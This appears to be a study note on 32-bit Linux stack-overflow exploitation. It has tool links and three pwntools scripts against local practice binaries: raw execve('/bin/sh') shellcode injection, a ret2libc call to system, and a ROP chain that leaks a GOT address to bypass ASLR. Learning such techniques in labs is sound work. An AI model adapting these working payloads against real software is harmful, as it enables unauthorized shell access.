https://segmentfault.com/a/1190000005888964
http://peckerwood.top/post/rop_0x01/
### checksec
https://github.com/slimm609/checksec.sh

### pattern.py:
https://github.com/Svenito/exploit-pattern

### MSF
https://github.com/g0tmi1k/msfpc

### pwn tools
https://docs.pwntools.com/en/stable/

### code
```python
#!/usr/bin/env python3


# NX = OFF, ASLR = OFF, Canary = OFF

from pwn import *
import binascii

p = process('./rop')
ret = 0xffffd080
# core dump的buf地址可能会改变，需要在一段时间后执行脚本要重新计算ret值
shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += b"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += b"\x0b\xcd\x80"

#print (binascii.hexlify(shellcode))

"""
shellcode = asm('''
xor ecx, ecx
mul ecx
push ecx
push 0x68732f2f  
push 0x6e69622f   
mov ebx, esp
mov al, 11
int 0x80
''')
"""

code = shellcode
code += bytes(('A' * (140 - len(shellcode))).encode())
code += p32(ret)
print (binascii.hexlify(bytearray(code)))

p.send(code)

p.interactive()

```
## ret2libc NX enabled
``` python
#!/usr/bin/env python3
from pwn import *
import binascii

p = process('./rop_ep')

# system() address in libc. 
# gdb$ break main 
# gdb$ run
# gdb$ print system  
system = 0xf7e132e0

# "/bin/sh" in libc.
# gdb$ print __libc_start_main
# gdb$ find &libc_main(), +22000, "/bin/sh"
param = 0xf7f540af

code = bytes(('A' * 140).encode())
code += p32(system) 
code += p32(0xdeadbeef)
code += p32(param)
print (binascii.hexlify(bytearray(code)))

p.send(code)

p.interactive()
```
## ASLR + NX enabled

```python

#!/usr/bin/env python3
from pwn import *
import binascii

# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# ASLR:     Enabled

p = process('./rop_aslr')

libc = ELF('libc.so.6')
elf = ELF("rop_aslr")

# call write@plt to print the write() address
plt_wr = elf.symbols['write']
print('plt_addr= ' + hex(plt_wr))
got_wr = elf.got['write']
print('got_addr= ' + hex(got_wr))
fun_addr = 0x08048456
payload = bytes(('A'*140).encode()) + p32(plt_wr) + p32(fun_addr) + p32(1) + p32(got_wr) + p32(4)
p.send(payload)

# calculate the relative distance of write and system() & "/bin/sh"
wr_addr = u32(p.recv(4))
print('wr_addr= ' + hex(wr_addr))
system_addr = wr_addr - (libc.symbols['write'] - libc.symbols['system'])
print('system_addr= ' + hex(system_addr))
binsh_addr = wr_addr - (libc.symbols['write'] - next(libc.search(bytes(('/bin/sh').encode()))))
print('binsh_addr= ' + hex(binsh_addr))

payload2 = bytes(('A'*140).encode()) + p32(system_addr) + p32(fun_addr) + p32(binsh_addr)

# send the code
p.send(payload2)
p.interactive()
```
